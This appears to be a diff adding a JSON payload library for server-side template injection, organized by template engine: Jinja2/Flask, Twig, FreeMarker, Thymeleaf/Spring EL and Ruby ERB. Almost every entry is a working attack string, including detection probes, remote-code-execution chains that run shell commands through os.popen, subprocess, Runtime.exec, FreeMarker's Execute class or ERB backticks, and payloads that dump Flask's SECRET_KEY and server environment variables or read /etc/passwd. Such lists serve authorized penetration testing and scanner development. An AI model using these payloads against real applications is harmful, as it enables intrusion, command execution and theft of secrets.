@@ -1,0 +1,62 @@
+{
+  "category": "ssti",
+  "contexts": {
+    "jinja2": {
+      "description": "Server-Side Template Injection payloads for Python Jinja2/Flask",
+      "payloads": [
+        {"payload": "{{7*7}}", "description": "Basic arithmetic probe (49 confirms SSTI)", "waf_bypass": false},
+        {"payload": "{{7*'7'}}", "description": "String multiplication probe (7777777 = Jinja2, 49 = Twig)", "waf_bypass": false},
+        {"payload": "{{config}}", "description": "Dump Flask config object (may leak SECRET_KEY)", "waf_bypass": false},
+        {"payload": "{{config.items()}}", "description": "Iterate config key-value pairs", "waf_bypass": false},
+        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "description": "List all object subclasses for gadget hunting", "waf_bypass": false},
+        {"payload": "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}", "description": "RCE via subprocess.Popen subclass (index varies by Python version)", "waf_bypass": false},
+        {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "description": "RCE via request globals builtins import chain", "waf_bypass": false},
+        {"payload": "{{lipsum.__globals__['os'].popen('id').read()}}", "description": "RCE via lipsum Jinja2 global os module", "waf_bypass": false},
+        {"payload": "{% for x in [].__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}", "description": "Loop-based RCE via warnings module subclass", "waf_bypass": false},
+        {"payload": "{{url_for.__globals__.os.popen('id').read()}}", "description": "RCE via url_for globals os reference", "waf_bypass": false},
+        {"payload": "{{get_flashed_messages.__globals__['current_app'].config}}", "description": "Config leak via get_flashed_messages globals", "waf_bypass": false}
+      ]
+    },
+    "twig": {
+      "description": "Server-Side Template Injection payloads for PHP Twig",
+      "payloads": [
+        {"payload": "{{7*7}}", "description": "Basic arithmetic probe", "waf_bypass": false},
+        {"payload": "{{7*'7'}}", "description": "String multiplication (49 = Twig, 7777777 = Jinja2)", "waf_bypass": false},
+        {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}", "description": "Twig 1.x registerUndefinedFilterCallback RCE setup", "waf_bypass": false},
+        {"payload": "{{_self.env.getFilter('id')}}", "description": "Twig 1.x RCE trigger after registering exec filter", "waf_bypass": false},
+        {"payload": "{{['id']|filter('system')}}", "description": "Twig 3.x array filter with system function", "waf_bypass": false},
+        {"payload": "{{app.request.server.all|join(',')}}", "description": "Dump server environment variables", "waf_bypass": false},
+        {"payload": "{{'id'|system}}", "description": "System filter call shorthand", "waf_bypass": false}
+      ]
+    },
+    "freemarker": {
+      "description": "Server-Side Template Injection payloads for Java FreeMarker",
+      "payloads": [
+        {"payload": "${7*7}", "description": "Basic arithmetic probe", "waf_bypass": false},
+        {"payload": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "description": "RCE via Execute utility class", "waf_bypass": false},
+        {"payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "description": "Inline Execute utility RCE", "waf_bypass": false},
+        {"payload": "<#assign ob = \"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"id\").start()}", "description": "RCE via ProcessBuilder through ObjectConstructor", "waf_bypass": false},
+        {"payload": "<#list .data_model?keys as x>${x}<br/></#list>", "description": "Enumerate data model keys", "waf_bypass": false}
+      ]
+    },
+    "thymeleaf": {
+      "description": "Server-Side Template Injection payloads for Java Thymeleaf with Spring EL",
+      "payloads": [
+        {"payload": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "description": "Spring EL preprocessing expression RCE", "waf_bypass": false},
+        {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "description": "Spring EL Runtime.exec direct injection", "waf_bypass": false},
+        {"payload": "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}", "description": "Spring EL RCE with IOUtils output capture", "waf_bypass": false},
+        {"payload": "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x", "description": "Scanner-based command output capture", "waf_bypass": false}
+      ]
+    },
+    "erb": {
+      "description": "Server-Side Template Injection payloads for Ruby ERB templates",
+      "payloads": [
+        {"payload": "<%= 7*7 %>", "description": "Basic arithmetic probe (returns 49)", "waf_bypass": false},
+        {"payload": "<%= `id` %>", "description": "RCE via backtick shell execution in ERB", "waf_bypass": false},
+        {"payload": "<%= IO.popen('id').read %>", "description": "RCE via IO.popen with output capture", "waf_bypass": false},
+        {"payload": "<%= require 'open3'; Open3.capture2('id')[0] %>", "description": "RCE via Open3.capture2", "waf_bypass": false},
+        {"payload": "<%= File.read('/etc/passwd') %>", "description": "File read via ERB File.read", "waf_bypass": false}
+      ]
+    }
+  }
+}
